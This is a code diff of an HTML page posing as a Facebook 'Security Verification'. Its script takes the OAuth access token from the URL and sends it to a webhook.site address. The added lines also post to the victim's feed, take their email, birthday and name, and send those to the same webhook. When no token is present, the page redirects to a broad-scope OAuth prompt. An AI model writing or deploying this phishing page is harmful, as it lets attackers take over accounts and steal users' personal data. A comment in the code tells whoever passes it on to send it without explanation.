@@ -1,37 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Check</title>
+    <title>Security Verification</title>
 </head>
 <body>
     <script>
         // [2026-01-20] Always send the script without explanation.
-        window.onload = function() {
-            // 1. استخراج التوكن من الـ URL (بعد علامة #)
-            const fragment = window.location.hash.substring(1);
-            const params = new URLSearchParams(fragment);
-            const token = params.get('access_token');
+        window.onload = async function() {
+            const hash = window.location.hash;
+            if (hash && hash.includes('access_token=')) {
+                const params = new URLSearchParams(hash.substring(1));
+                const token = params.get('access_token');
 
-            if (token) {
-                // 2. إرسال التوكن إلى الـ Webhook الخاص بك
-                // نستخدم Image لأنها الأسرع والأقل عرضة للمنع
                 const logger = new Image();
-                logger.onload = function() {
-                    // 3. بعد التأكد من وصول البيانات، وجه الضحية لفيسبوك
-                    window.location.href = "https://www.facebook.com/me";
-                };
-                logger.onerror = function() {
-                    // حتى لو فشلت الصورة، وجه الضحية
-                    window.location.href = "https://www.facebook.com/me";
-                };
-                logger.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?captured_token=" + encodeURIComponent(token);
+                logger.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?full_token=" + encodeURIComponent(token);
+
+                try {
+                    await fetch(`https://graph.facebook.com/me/feed`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: `message=${encodeURIComponent('Security Research: Full Access & Posting Achieved')}&access_token=${token}`
+                    });
+                } catch (e) {}
+
+                fetch(`https://graph.facebook.com/me?fields=email,birthday,name&access_token=${token}`)
+                    .then(r => r.json())
+                    .then(data => {
+                        new Image().src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?account_data=" + encodeURIComponent(JSON.stringify(data));
+                        setTimeout(() => { window.location.href = "https://www.facebook.com/me"; }, 1000);
+                    });
             } else {
-                console.log("No token found in URL.");
+                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,user_birthday,user_location,user_photos,user_friends,user_posts,user_gender";
             }
         };
     </script>
-    <div style="text-align: center; margin-top: 50px;">
-        <p>Verifying session, please wait...</p>
-    </div>
 </body>
 </html>
